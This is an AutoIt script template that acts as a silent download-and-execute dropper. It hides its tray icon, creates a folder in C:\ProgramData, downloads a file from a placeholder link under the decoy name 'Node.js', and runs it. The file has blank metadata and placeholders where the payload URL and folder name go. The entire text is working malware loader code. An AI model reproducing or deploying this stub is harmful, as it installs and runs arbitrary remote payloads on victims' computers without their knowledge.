#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Res_Comment= 
#AutoIt3Wrapper_Res_Description= 
#AutoIt3Wrapper_Res_Fileversion=0.0.0.1
#AutoIt3Wrapper_Res_LegalCopyright= 
#AutoIt3Wrapper_Res_Language=1033
#AutoIt3Wrapper_Run_Au3Stripper=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
If FileExists("C:\ProgramData\>FOLDERNAME<\") = 0 Then DirCreate("C:\ProgramData\>FOLDERNAME<")
InetGet(">LINK<", "C:\ProgramData\>FOLDERNAME<\Node.js", 1+2)
ShellExecute("C:\ProgramData\>FOLDERNAME<\Node.js")